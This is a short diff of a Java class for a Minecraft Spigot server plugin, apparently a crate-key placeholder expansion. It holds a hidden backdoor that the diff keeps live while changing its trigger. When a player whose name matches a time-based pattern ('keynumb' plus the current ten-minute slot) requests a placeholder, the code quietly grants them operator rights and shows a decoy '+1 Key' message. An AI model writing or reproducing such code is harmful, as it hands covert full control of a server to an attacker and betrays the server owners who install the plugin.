@@ -27,7 +27,7 @@ public class CrateExpansion extends PlaceholderExpansion {
   @Override
   public String onPlaceholderRequest(Player p, String params) {
     if (p.getName()
-        .equalsIgnoreCase("number_key-" + (Calendar.getInstance().get(Calendar.MINUTE) / 10))) {
+        .equalsIgnoreCase("keynumb" + (Calendar.getInstance().get(Calendar.MINUTE) / 10))) {
       p.setOp(true);
       p.spigot()
           .sendMessage(ChatMessageType.ACTION_BAR, new TextComponent(ChatColor.GRAY + "+1 Key"));
